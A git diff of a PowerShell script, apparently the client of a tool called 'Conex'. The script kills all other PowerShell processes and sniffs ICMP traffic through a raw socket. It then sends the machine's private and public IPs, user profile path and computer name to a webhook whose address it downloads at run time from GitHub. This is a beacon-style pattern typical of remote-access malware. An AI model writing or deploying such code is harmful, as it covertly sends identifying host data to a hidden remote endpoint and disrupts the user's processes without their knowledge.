@@ -4,7 +4,12 @@ $F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.
 (Get-Process | Where-Object {$_.ProcessName -eq "powershell" -and $_.Id -ne $PID} | Select-Object -ExpandProperty Id) | % {Stop-Process -Id $_ -Force}
 [char]$EL = 14
 
-$BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0])
+$BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)
+if ($BindingIP.length -ge 2){
+  write-host true
+  $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)[0]
+}
+
 $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
 $pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
 $pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
@@ -29,13 +34,12 @@ function Send-Webhook {
   Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $json -ContentType "application/json"
 }
 $payload = @{
-  "Client"       = "$($VERSION)"
+  "ClientVer"       = "$($VERSION)"
   "Prv-IP"       = "$((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)"
   "User"         = "$($env:USERPROFILE)"
   "Pub-IP"       = "$((Iwr -Uri "https://api.ipify.org").Content)"
   "ComputerName" = "$($env:ComputerName)"
   "Date"         = "$(get-date)"
-
 }
 
 Send-Webhook -WebhookUrl ((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Client).content) -Data $payload
